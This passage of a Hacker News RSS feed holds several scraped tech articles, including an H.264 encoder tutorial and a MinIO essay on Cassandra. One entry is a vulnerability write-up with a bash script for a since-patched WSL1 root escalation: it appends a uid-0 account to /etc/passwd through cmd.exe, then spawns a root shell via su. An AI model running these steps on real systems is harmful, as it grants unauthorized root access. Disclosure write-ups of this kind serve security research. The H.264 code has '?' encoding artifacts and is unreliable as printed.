<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php">https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php</a></em></p>]]>
            </description>
            <link>https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813071</guid>
            <pubDate>Sun, 17 Jan 2021 18:05:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analysing Algorithms: Worst Case Running Time]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813015">thread link</a>) | @luciferreeves
<br/>
January 17, 2021 | https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time | <a href="https://web.archive.org/web/*/https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813015</guid>
            <pubDate>Sun, 17 Jan 2021 17:58:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Smallest H.264 encoder in 30 LOC]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25812581">thread link</a>) | @ramshanker
<br/>
January 17, 2021 | https://www.cardinalpeak.com/worlds-smallest-h-264-encoder | <a href="https://web.archive.org/web/*/https://www.cardinalpeak.com/worlds-smallest-h-264-encoder">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Recently I have been studying the <a href="https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC">H.264 video codec</a> and reading the <a href="http://www.iso.org/iso/iso_catalogue/catalogue_ics/catalogue_detail_ics.htm?csnumber=50726">ISO spec</a>. H.264 a much more sophisticated codec than MPEG-2, which means that a well-implemented H.264 encoder has more compression tools at its disposal than the equivalent MPEG-2 encoder. But all that sophistication comes at a price: H.264 also has a big, complicated specification with a plethora of options, many of which are not commonly used, and it takes expertise to understand which parts are important to solve a given problem.</p>
<p>As a bit of a parlor trick, I decided to write the simplest possible H.264 encoder. I was able to do it in about 30 lines of code — although truth in advertising compels me to admit that it doesn’t actually compress the video at all!</p>
<p>While I don’t want to balloon this blog post with a detailed description of H.264, a little background is in order. An H.264 stream contains the encoded video data along with various parameters needed by a decoder in order to decode the video data. To structure this data, the bitstream consists of a sequence of <a href="https://en.wikipedia.org/wiki/Network_Abstraction_Layer">Network Abstraction Layer (NAL) units</a>.</p>
<p>Previous MPEG specifications allowed pictures to be coded as <a href="https://en.wikipedia.org/wiki/Video_compression_picture_types">I-frames, P-frames, or B-frames</a>. H.264 is more complex and wonderful. It allows individual frames to be coded as multiple slices, each of which can be of type I, P, or B or even more esoteric types. This feature can be used in <a href="http://x264dev.multimedia.cx/?p=249">creative ways</a> to achieve different video coding goals. In our encoder we will use one slice per frame for simplicity, and we will use all I-frames.</p>
<p>As with previous MPEG specifications, in H.264 each slice consists of one or more 16×16 <a href="https://en.wikipedia.org/wiki/Macroblock">macroblocks</a>. Each macroblock in our <a href="https://en.wikipedia.org/wiki/Chroma_subsampling">4:2:0 sampling scheme</a> contains 16×16 luma samples, and two 8×8 blocks of chroma samples. For this simple encoder, I won’t be compressing the video data at all, so the samples will be directly copied into the H.264 output.</p>
<p>With that background in mind, for our simplest possible encoder, there are three NALs we have to emit:</p>
<ol>
<li><span>Sequence Parameter Set (SPS): Once per stream</span></li>
<li><span>Picture Parameter Set (PPS): Once per stream</span></li>
<li><span>Slice Header: Once per video frame</span>
<ol type="a">
<li><span>Slice Header information</span></li>
<li><span>Macroblock Header: Once per macroblock</span></li>
<li><span>Coded Macroblock Data: The actual coded video for the macroblock</span></li>
</ol>
</li>
</ol>
<p>Since the SPS, the PPS, and the slice header are static for this application, I was able to hand-code them and include them in my encoder as a sequence of magic bits.</p>
<p>Putting it all together, I came up with the following code for what I call “hello264”:</p>
<pre>#include &lt;stdio.h&gt;</pre>
<pre>#include &lt;stdlib.h&gt;</pre>
<pre>?</pre>
<pre>/* SQCIF */</pre>
<pre>#define LUMA_WIDTH 128</pre>
<pre>#define LUMA_HEIGHT 96</pre>
<pre>#define CHROMA_WIDTH LUMA_WIDTH / 2</pre>
<pre>#define CHROMA_HEIGHT LUMA_HEIGHT / 2</pre>
<pre>?</pre>
<pre>/* YUV planar data, as written by ffmpeg */</pre>
<pre>typedef struct</pre>
<pre>{</pre>
<pre>uint8_t Y[LUMA_HEIGHT][LUMA_WIDTH];</pre>
<pre>uint8_t Cb[CHROMA_HEIGHT][CHROMA_WIDTH];</pre>
<pre>uint8_t Cr[CHROMA_HEIGHT][CHROMA_WIDTH];</pre>
<pre>} __attribute__((__packed__)) frame_t;</pre>
<pre>?</pre>
<pre>frame_t frame;</pre>
<pre>?</pre>
<pre>/* H.264 bitstreams */</pre>
<pre>const uint8_t sps[] = { 0x00, 0x00, 0x00, 0x01, 0x67, 0x42, 0x00,</pre>
<pre>0x0a, 0xf8, 0x41, 0xa2 };</pre>
<pre>const uint8_t pps[] = { 0x00, 0x00, 0x00, 0x01, 0x68, 0xce,</pre>
<pre>0x38, 0x80 };</pre>
<pre>const uint8_t slice_header[] = { 0x00, 0x00, 0x00, 0x01, 0x05, 0x88,</pre>
<pre>0x84, 0x21, 0xa0 };</pre>
<pre>const uint8_t macroblock_header[] = { 0x0d, 0x00 };</pre>
<pre>?</pre>
<pre>/* Write a macroblock's worth of YUV data in I_PCM mode */</pre>
<pre>void macroblock(const int i, const int j)</pre>
<pre>{</pre>
<pre>int x, y;</pre>
<pre>?</pre>
<pre>if (! ((i == 0) &amp;&amp; (j == 0)))</pre>
<pre>{</pre>
<pre>fwrite(&amp;macroblock_header, 1, sizeof(macroblock_header),</pre>
<pre>stdout);</pre>
<pre>}</pre>
<pre>?</pre>
<pre>for(x = i*16; x &lt; (i+1)*16; x++)</pre>
<pre>for (y = j*16; y &lt; (j+1)*16; y++)</pre>
<pre>fwrite(&amp;frame.Y[x][y], 1, 1, stdout);</pre>
<pre>for (x = i*8; x &lt; (i+1)*8; x++)</pre>
<pre>for (y = j*8; y &lt; (j+1)*8; y++)</pre>
<pre>fwrite(&amp;frame.Cb[x][y], 1, 1, stdout);</pre>
<pre>for (x = i*8; x &lt; (i+1)*8; x++)</pre>
<pre>for (y = j*8; y &lt; (j+1)*8; y++)</pre>
<pre>fwrite(&amp;frame.Cr[x][y], 1, 1, stdout);</pre>
<pre>}</pre>
<pre>?</pre>
<pre>/* Write out PPS, SPS, and loop over input, writing out I slices */</pre>
<pre>int main(int argc, char **argv)</pre>
<pre>{</pre>
<pre>int i, j;</pre>
<pre>?</pre>
<pre>fwrite(sps, 1, sizeof(sps), stdout);</pre>
<pre>fwrite(pps, 1, sizeof(pps), stdout);</pre>
<pre>?</pre>
<pre>while (! feof(stdin))</pre>
<pre>{</pre>
<pre>fread(&amp;frame, 1, sizeof(frame), stdin);</pre>
<pre>fwrite(slice_header, 1, sizeof(slice_header), stdout);</pre>
<pre>?</pre>
<pre>for (i = 0; i &lt; LUMA_HEIGHT/16 ; i++)</pre>
<pre>for (j = 0; j &lt; LUMA_WIDTH/16; j++)</pre>
<pre>macroblock(i, j);</pre>
<pre>?</pre>
<pre>fputc(0x80, stdout); /* slice stop bit */</pre>
<pre>}</pre>
<pre>?</pre>
<pre>return 0;</pre>
<pre>}</pre>
<p>(This source code is available as a single file <a href="https://cardinalpeak.com/downloads/hello264.c">here</a>.)</p>
<p>In <code>main()</code>, the encoder writes out the SPS and PPS. Then it reads YUV data from standard input, stores it in a frame buffer, and then writes out an H.264 slice header. It then loops over each macroblock in the frame and calls the <code>macroblock()</code> function to output a macroblock header indicating the macroblock is coded as I_PCM, and inserts the YUV data.</p>
<p>To use the code, you will need some uncompressed video. To generate this, I used the <a href="https://ffmpeg.org/">ffmpeg</a> package to convert a QuickTime movie from my <a href="https://cardinalpeak.com/blog/?p=240">Kodak Zi8 video camera</a> from H.264 to <a href="https://en.wikipedia.org/wiki/Common_Intermediate_Format">SQCIF</a> (128×96) planar <a href="https://en.wikipedia.org/wiki/YUV">YUV</a> format sampled at 4:2:0:</p>
<pre>ffmpeg.exe -i angel.mov -s sqcif -pix_fmt yuv420p angel.yuv</pre>
<p>I compile the H.264 encoder:</p>
<pre>gcc ?Wall ?ansi hello264.c ?o hello264</pre>
<p>And run it:</p>
<pre>hello264 &lt;angel.yuv &gt;angel.264</pre>
<p>Finally, I use ffmpeg to copy the raw H.264 NAL units into an MP4 file:</p>
<pre>ffmpeg.exe -f h264 -i angel.264 -vcodec copy angel.mp4</pre>
<p>Here is the resulting output:</p>

<p>There you have it — a complete H.264 encoder that uses minimal CPU cycles, with output larger than its input!</p>
<p>The next thing to add to this encoder would be CAVLC coding of macroblocks and intra prediction. The encoder would still be lossless at this point, but there would start to be compression of data. After that, the next logical step would be quantization to allow lossy compression, and then I would add P slices. As a development methodology, I prefer to bring up a simplistic version of an application, get it running, and then add refinements iteratively.</p>
<p>UPDATE 4/20/11: I’ve written more about the Sequence Parameter Set (SPS) <a href="https://cardinalpeak.com/blog/?p=878">here</a>.</p>
<p><em>Ben Mesander has more than 18 years of experience leading software development teams and implementing software. His strengths include Linux, C, C++, numerical methods, control systems and </em><a href="https://www.cardinalpeak.com/expertise/signalprocessing.php"><em>digital signal processing</em></a><em>. His experience includes </em><a href="https://www.cardinalpeak.com/expertise/embeddedsoftware.php"><em>embedded software</em></a><em>, scientific software and enterprise software development environments.</em></p>
</div></div>]]>
            </description>
            <link>https://www.cardinalpeak.com/worlds-smallest-h-264-encoder</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812581</guid>
            <pubDate>Sun, 17 Jan 2021 17:20:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Root Escalation Vulnerability in WSL1]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25812519">thread link</a>) | @junon
<br/>
January 17, 2021 | https://boring.dev/2021/01/17/root-escalation-vulnerability-in-wsl1/ | <a href="https://web.archive.org/web/*/https://boring.dev/2021/01/17/root-escalation-vulnerability-in-wsl1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<div>
				
				<p>by Alto Alexander, posted January 17th 2021, 5:30:13 am</p>
				<blockquote>
<p><strong>NOTE: This vulnerability seems to have been silently patched by Microsoft since reaching out to them.</strong>
Whether or not my reaching out to them was what triggered the fix, I can’t say for sure.</p>
</blockquote>
<p>About a year ago I accidentally came across some strange filesystem properties
in WSL1 that I was ultimately able to exploit to gain root permissions in the
Ubuntu system I was running under WSL1. However, I imagine this could have been used
in any Linux installation under the WSL1 subsystem.</p>
<p>Speaking of Microsoft, I reached out to three different members of the WSL team regarding
any sort of bounty program for a WSL1 vulnerability regarding root escalation by means of the
filesystem bridge, or if that was something they’d be interested in. None of said contacts
wanted much to do with me. I was met with short responses, and ultimately ghosted entirely.</p>
<p>Microsoft has since patched this, so I guess if you can do it yourself, fuck the security
community right?</p>
<p>So I figured I’d write about it here.</p>
<p>Before I begin, let me give you my unsolicited opinion: both WSL1 and 2 are terrible
excuses for software and you should not be using them if you need a secure Linux installation.
Just use bare-metal Linux, or a proper VM (WSL2 is not a proper VM<sup><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=25612962">[1]</a></sup><sup><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=24641441">[2]</a></sup>).
We need to stop giving big corporations a free pass to spit out whatever nonsense they want while their employees
yell at independent open-sourcers for not moving fast enough, all the while profiting off
their work with little to no compensation.</p>
<p>With that, let’s begin.</p>
<hr>
<p>The exploit is rather simple - so simple, in fact, that it was found <em>by accident</em> while writing some
build scripts that utilized a Windows executable to generate a file in the Linux filesystem.</p>
<p>When a file is created from Windows in the Linux subsystem’s filesystem via the network mount,
the file has User-level security and permissions on Windows, but <code>root:root</code> ownership and
<code>a+wrx</code> permissions on Linux.</p>
<p>Why Microsoft decided this was a sane default concerns me.</p>
<p>All we have to do is tack on an entry in <code>passwd</code> with <code>uid=0,gid=0</code> using the Windows console
and we’re able to <code>su</code>; however, in my findings, I couldn’t execute just anything under <code>su</code> as
the dummy root account, but the one thing I could run under <code>su</code> was <code>su</code> itself, and since
I was <code>uid=0</code> then I could simply run <code>su root</code> again and drop a shell as the <em>real</em> <code>root</code> account.</p>
<p>Putting it all together, let’s set up our elevation script with some boilerplate that makes sure
we’re not masking any errors.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span>#</span><span>!/usr/bin/env bash</span></span><br><span>set -euo pipefail</span><br></pre></td></tr></tbody></table></figure>
<p>Then, let’s make sure we’re actually running under WSL (because it makes no sense to attempt this
in any other environment).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span>function is_wsl() {</span><br><span>	command -v wslpath &amp;&gt;/dev/null</span><br><span>}</span><br><span>if ! is_wsl; then</span><br><span>	echo 'error: not wsl' &gt;&amp;2</span><br><span>	exit 1</span><br><span>fi</span><br></pre></td></tr></tbody></table></figure>
<p>Next, we’ll create a temporary file that we can <code>type.exe</code> out from the Windows side. This file
will contain our dummy root account entry that will be appended to <code>passwd</code>. Note the UID and GID
fields being <code>0</code>.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>printf '%s\n' "lul::0:0::/:/bin/bash" &gt; /tmp/passwd.lul</span><br></pre></td></tr></tbody></table></figure>
<p>Now, we make use of WSL1’s automatic <code>.exe</code> handling and execute <code>cmd.exe</code> to append our entry
to <code>/etc/passwd</code>. Since Window’s doesn’t understand Linux paths inherently, we pass them through the
<code>wslpath</code> utility first.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>cmd.exe /C type "$(wslpath -w /)tmp\\passwd.lul" \&gt;\&gt; "$(wslpath -w /)etc\\passwd"</span><br></pre></td></tr></tbody></table></figure>
<p>A little cleanup.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>rm /tmp/passwd.lul</span><br></pre></td></tr></tbody></table></figure>
<p>Finally, we drop a root shell using the nested <code>su</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>su - lul /bin/sh -c /bin/su root</span><br></pre></td></tr></tbody></table></figure>
<hr>
<p>Creating a file using this method no longer creates the files as root, but as the running user within
the linux subsystem, which effectively patched everything up. That being said, I can almost guarantee
you this was abused in some fashion, maliciously or not.</p>
<p>I’m a little annoyed that Microsoft didn’t take my attempt to report seriously, but still found it important enough
<em>internally</em> to investigate and fix it. Now with all of the shit coming out about WSL2 being utter garbage,
it’s safe to say that WSL is, overall, a very failed experiment - which says something about NT, which was
designed exactly for this purpose.</p>
<p>I suppose I’m happy it’s patched, but still leaves a really shit taste in my mouth.</p>
<p>- Alto</p>

			</div>
		</div></div>]]>
            </description>
            <link>https://boring.dev/2021/01/17/root-escalation-vulnerability-in-wsl1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812519</guid>
            <pubDate>Sun, 17 Jan 2021 17:16:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacker News sentiment towards Big Tech companies]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25812346">thread link</a>) | @greatwave1
<br/>
January 17, 2021 | https://www.quiverquant.com/sources/hackernews | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p><a href="https://www.quiverquant.com/">
						<img src="https://www.quiverquant.com/static/img/logo.png" alt="">
					</a></p><p>Quiver scrapes alternative stock data from across the internet and aggregates it in a free, easy-to-use web dashboard.</p>
					<div>
						<p><span>Copyright © 2020 Quiver Quantitative, Inc. All rights reserved.</span></p><ul>
							<li><a href="https://www.quiverquant.com/privacypolicy">Privacy Policy</a></li>
							<li><a href="https://www.quiverquant.com/termsofservice">Terms of Service</a></li>
						</ul>
					</div>
				</div></div>]]>
            </description>
            <link>https://www.quiverquant.com/sources/hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812346</guid>
            <pubDate>Sun, 17 Jan 2021 17:03:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Using Cassandra as a metadata database for an object store is a bad choice]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25812125">thread link</a>) | @jtsymonds
<br/>
January 17, 2021 | https://blog.min.io/the-trouble-with-cassandra-based-object-stores/ | <a href="https://web.archive.org/web/*/https://blog.min.io/the-trouble-with-cassandra-based-object-stores/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                

                    <figure>
                        <img srcset="https://blog.min.io/content/images/size/w300/2021/01/pexels-pixabay-158826.jpg 300w,
                                    https://blog.min.io/content/images/size/w600/2021/01/pexels-pixabay-158826.jpg 600w,
                                    https://blog.min.io/content/images/size/w1000/2021/01/pexels-pixabay-158826.jpg 1000w,
                                    https://blog.min.io/content/images/size/w2000/2021/01/pexels-pixabay-158826.jpg 2000w" sizes="(max-width: 800px) 400px,
                                    (max-width: 1170px) 700px,
                                    1400px" src="https://blog.min.io/content/images/size/w2000/2021/01/pexels-pixabay-158826.jpg" alt="The Trouble With Cassandra: Why It's a Poor Choice For a Metadata Database for Object Stores">
                    </figure>

                <section>
                    <p>Cassandra is a popular, tried-and-true NoSQL database that supports key-value wide-column tables. Like any powerful tool, Cassandra has its ideal use cases - in particular, Cassandra excels at supporting write-heavy workloads, while having limitations when supporting read-heavy workloads. Cassandra's eventual consistency model and lack of transactions, multi-table support like joins, subqueries can also limit its usefulness.</p><p>However, using Cassandra as a metadata database for an object storage system introduces significant complexity resulting in data integrity and performance issues at scale - particularly if one wants to use their object store as a primary storage system. Object storage needs are far simpler and different from what Cassandra is built for.</p><p>Because the implications of employing Cassandra as a object storage metadata database were not properly understood, many object storage vendors made it a foundational part of their architecture - unfortunately it keeps them from ever moving past simple archival workloads into the modern workloads that define the future of object storage (AI/ML, analytics, web/mobile applications).</p><p>Let’s explore why in a little more detail.</p><ol><li>Cassandra was never designed to manage file or object storage metadata and it is predictably weak in this regard. It is <a href="https://docs.datastax.com/en/cassandra-oss/2.2/cassandra/dml/dmlTransactionsDiffer.html">not ACID compliant</a>. It does not have the rigidity to prevent partially successful writes, dupes, contradictions and the like. Cassandra does not support joins or foreign keys, and consequently does not offer consistency in the ACID sense. Further, there is no capacity to roll back transactions in the event of a failure. <p>While Cassandra supports atomicity and isolation at the row-level, it trades transactional isolation and atomicity for high availability and fast write performance. </p></li><li>Cassandra is categorized as an AP system in CAP. Meaning it trades Consistency for Availability and Partition tolerance. When employing Cassandra as a metadata database for an object store, you can either be fast or consistent - but not both at the same time. <p>Cassandra’s tunable consistency is a compromise, not a feature. Any setting other than <a href="https://docs.datastax.com/en/cassandra-oss/3.0/cassandra/dml/dmlConfigConsistency.html">QUORUM or ALL</a> means you are at risk of reading stale data. It is important to apply this consistency setting for both read and write operations in addition to the object data operations performed outside of it. </p><p>In the object storage world, the implication is that you can be good for archival use cases (write once, read very infrequently) or you choose a different architecture. </p></li><li>Similar to the consistency problem, durability guarantee is also a tradeoff between performance and correctness. The storage engine’s default <a href="https://cassandra.apache.org/doc/latest/architecture/storage_engine.html">commit log</a> is set to sync periodically every 10 seconds. This means you will lose up to 10 seconds worth of latest updates in the event of power failure. The only reasonable way to make Cassandra durable is to use the synchronous batch mode committer which comes with a performance penalty. </li><li>Cassandra’s high-availability guarantee is not suited for erasure coded object stores. With a replication factor of 3 and consistency quorum of 2, Cassandra can only tolerate a single node / drive failure within a replication group. Increasing the replication factor and quorum consistency to 5 or higher serves only to make the meta performance go from bad to worse. Unlike replication, erasure coding can tolerate multiple servers and drives failures in a distributed system. Even if you have configured the erasure code setting to 6 parity (any 6 nodes may fail) in a 16 node setup, you are still limited by the weak link, i.e Cassandra’s replication factor. The ops team is often unaware of these high-availability surprises until it is too late.</li><li>Object storage systems organize the data in a tree structured hierarchical namespace. Since Cassandra does not support a hierarchical key namespace, you will have to build a tree data model on top for each directory prefix and also maintain a flat list for direct lookups without directory walk. Atomically updating multiple tables with batched commit log and full read / write quorum is slow and prone to &nbsp;corruption.</li><li>While objects themselves are immutable, the object storage system is mutable. When you add, remove, overwrite objects and its metadata, apply policies, collect metrics, grant session tokens and rotating credentials, the metadata is always mutating. Cassandra is not designed to handle this level of metadata mutation and definitely not for the primary storage workloads. Long term archival use cases where the objects are large (GBs in size) and infrequently accessed, will work - other use cases will not..<p>The reason is that Cassandra's log structured storage system quickly appends new writes to the end of the log file, but delays the deletes and overwrites with a tombstone marker. Vacuuming these tombstones is an expensive operation, because the actual delete operation is applied by copying the SSTables to a new table sieving the stale entries in the process. This operation has to be performed on all the nodes simultaneously. If you delay vacuuming, excessive tombstones will result in increased read latencies, memory GC pauses and failed queries. Some object storage vendors use an additional Redis database to offload Cassandra’s pressure. Using two databases to manage an object stores metadata is hardly elegant and introduces additional points of failure. &nbsp;</p><p>The biggest gotcha? You won’t see these problems until you are deep into production and it is too late.</p></li><li>Small objects (KB to MB in size) will fill up the metadata drives dedicated to Cassandra much sooner than the data drives. Also small object workloads exacerbate Cassandra’s limitations, because they are sensitive to latency and consistency issues. &nbsp;Some vendors store small objects entirely inside Cassandra to address this problem. At this point, you are merely looking at an S3 proxy on top of Cassandra database. <p>This too is a bad practice. </p><p>If you use your object store for large objects and employ erasure coding and use Cassandra as your data store for small objects and use replication - you have introduced a non-trivial SLA problem. In this approach, data is protected by different guarantees. Given that drives die all the time, the probability of serving an old object or a corrupted object goes up considerably. </p><p>As noted above, your metadata database is now the weak link. Availability, consistency and durability guarantees are only as good as the weakest link. If the weakest link employs replication (three copies) you can only withstand one-node or one drive failure before losing data.</p><p>A counter argument might be to replicate five copies. The result is a massive performance hit and you can still really only withstand two-node or two-drive failure. </p><p>In using replication for small objects and erasure coding for large objects you also undermine the efficiency gains associated with EC. If you only use erasure code for large objects (likely a small percent of your overall object pool) you don’t gain much but increase your exposure considerably.</p></li><li>Employing Cassandra as your metadata database for an object store also introduces a troublesome Java dependency. This in turn can result in bloatware and memory management issues. Cassandra taxes the JVM memory management with constant large scale metadata allocation and mutation resulting in memory exhaustion and garbage collection pauses. </li></ol><p>The obvious takeaway is that it is a lot more complicated to operate a Cassandra cluster than a properly designed object storage system. Cassandra is built for a different purpose and object-storage meta-data is not one of them. The areas where Cassandra struggles are the areas that are core to a performant, scalable and resilient object store.</p><p>The last point is of note - object storage is a natural fit for blob data and that is why Erasure Coding is so effective and efficient. Cassandra is designed for replication. When you use that model for metadata it breaks the object store’s erasure coding advantage (or at the very least makes it brittle and prone to breakage).</p><p><strong>Bottom line. Write your metadata atomically with your object. Never separate them.</strong><br></p><p>We welcome your comments. Feel free to engage us on Twitter, on our Slack channel or by dropping us a note at <a href="mailto:hello@min.io">hello@min.io</a>.</p>

                                    </section>

                <section>
                            <a href="https://blog.min.io/tag/s3-select/">S3 Select</a>
                            <a href="https://blog.min.io/tag/machine-learning/">Machine Learning</a>
                            <a href="https://blog.min.io/tag/s3/">S3</a>
                            <a href="https://blog.min.io/tag/performance/">Performance</a>
                            <a href="https://blog.min.io/tag/security/">Security</a>
                            <a href="https://blog.min.io/tag/brand-design/">Brand/Design</a>
                            <a href="https://blog.min.io/tag/spark/">Spark</a>
                            <a href="https://blog.min.io/tag/high-performance/">High Performance</a>
                            <a href="https://blog.min.io/tag/benchmarks/">Benchmarks</a>
                            <a href="https://blog.min.io/tag/integrations/">Integrations</a>
                            <a href="https://blog.min.io/tag/modern-data-lakes/">Modern Data Lakes</a>
                            <a href="https://blog.min.io/tag/kubernetes/">Kubernetes</a>
                            <a href="https://blog.min.io/tag/presto/">Presto</a>
                            <a href="https://blog.min.io/tag/sql/">SQL</a>
                            <a href="https://blog.min.io/tag/opensource/">opensource</a>
                            <a href="https://blog.min.io/tag/golang-2/">Golang</a>
                            <a href="https://blog.min.io/tag/programming/">Programming</a>
                            <a href="https://blog.min.io/tag/cloud-computing/">Cloud Computing</a>
                            <a href="https://blog.min.io/tag/golang/">golang</a>
                            <a href="https://blog.min.io/tag/microservices/">Microservices</a>
                            <a href="https://blog.min.io/tag/raspberry-pi/">Raspberry Pi</a>
                            <a href="https://blog.min.io/tag/github/">Github</a>
                            <a href="https://blog.min.io/tag/docker/">Docker</a>
                            <a href="https://blog.min.io/tag/aws/">AWS</a>
                            <a href="https://blog.min.io/tag/devops/">DevOps</a>
                            <a href="https://blog.min.io/tag/assembly/">Assembly</a>
                            <a href="https://blog.min.io/tag/compilers/">Compilers</a>
                            <a href="https://blog.min.io/tag/api/">API</a>
                            <a href="https://blog.min.io/tag/nginx/">Nginx</a>
                            <a href="https://blog.min.io/tag/dcos/">DCOS</a>
                            <a href="https://blog.min.io/tag/apache-spark/">Apache Spark</a>
                            <a href="https://blog.min.io/tag/open-source/">Open Source</a>
                            <a href="https://blog.min.io/tag/design/">Design</a>
                            <a href="https://blog.min.io/tag/support/">support</a>
                            <a href="https://blog.min.io/tag/subnet/">SUBNET</a>
                            <a href="https://blog.min.io/tag/news/">News</a>
                            <a href="https://blog.min.io/tag/splunk/">Splunk</a>
                            <a href="https://blog.min.io/tag/intel/">Intel</a>
                            <a href="https://blog.min.io/tag/edge-computing/">edge computing</a>
                            <a href="https://blog.min.io/tag/veeam/">Veeam</a>
                            <a href="https://blog.min.io/tag/sidekick/">Sidek…</a></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.min.io/the-trouble-with-cassandra-based-object-stores/">https://blog.min.io/the-trouble-with-cassandra-based-object-stores/</a></em></p>]]>
            </description>
            <link>https://blog.min.io/the-trouble-with-cassandra-based-object-stores/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812125</guid>
            <pubDate>Sun, 17 Jan 2021 16:38:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cyber Security; Beginner Roadmap]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 50 (<a href="https://news.ycombinator.com/item?id=25812025">thread link</a>) | @ashimi
<br/>
January 17, 2021 | https://blog.ashimi.xyz/cyber-security-beginner-roadmap-ckk1cmmvb08jfqps1amjuh10o | <a href="https://web.archive.org/web/*/https://blog.ashimi.xyz/cyber-security-beginner-roadmap-ckk1cmmvb08jfqps1amjuh10o">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>I previously wrote an article on <a target="_blank" href="https://blog.ashimi.xyz/how-to-be-a-hacker-ckgsepg7y05i9z9s10bl92iy7">How to be a Hacker</a>, and I mentioned taking courses and practicing in Safe Environments. We will be taking a more precise look at that.</p>
<p>We will be exploring a Beginner to Expert Roadmap as designed by Tux in the infographic below
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610889439172/wAmw3SEGa.jpeg?auto=compress" alt="1603267450360.jpg"></p>
<h2 id="learning">Learning</h2>
<ul>
<li><p><a target="_blank" href="https://tryhackme.com/">tryhackme.com</a> provides a wide variety of security topics you can select from. These security topics give you access to different vulnerable machines and they are to be scanned and exploited with different tools for you to be able to complete the given tasks. Although there are certain aspects where you would require premium access, most of it is free. Every learning path comes with a different cybersecurity topic and they are very crucial to understand various concepts. TryHackMe Network can be connected to via OpenVPN in order to deploy machines / various Operating systems and carry out exploits.</p>
</li>
<li><p><a target="_blank" href="https://immersivelabs.online/">immersivelabs.online</a> is a gamified learning lab that is developed by experts as an emulation of world-class security threats. It allows you to visualize your capabilities as Hacker, practice with the latest discovered security threats, and earn points for completing labs.
It has over 600labs, and it's one of the coolest places to hon your skills</p>
</li>
<li><p><a target="_blank" href="https://www.hackthebox.eu/">hackthebox.eu</a> is very much hard than the previous two because you can't sign up directly, you have to hack your way into the platform. It is focused on practicing your skills and it comes with a Social Network feeling as you can connect with millions of hackers on the platform, share ideas, methodologies, and even compete for the Leaderboards. But It also has an Academy, if you need to review your knowledge or learn new concepts.</p>
</li>
<li><p><a target="_blank" href="https://www.vulnhub.com/">VulnHub.com</a> provides materials allowing anyone to gain practical hands-on experience with digital security, computer applications, and network administration tasks. VulnHub offers offline virtual machines, allowing users to practice without competing with other learners. There’s no need to worry about consistent internet access, high pings, or latency. Users can set up their own private labs to practice and learn new skills.</p>
</li>
<li><p><a target="_blank" href="https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course">PEH by tcm</a> is a 25 hours course by TCM Security, it is one of the best-paid courses you can ever get. It is recommended to have a hackthebox account before starting the course. They focus only on tools and topics that will make you successful as an ethical hacker, it is completely hands-on and covers all foundational topics.</p>
</li>
</ul>
<h2 id="certification">Certification</h2>
<p>Once you have quite an experience in all of the above, you can decide to test your credibility and prepare for employment by getting the certifications, We will discuss below.</p>
<ul>
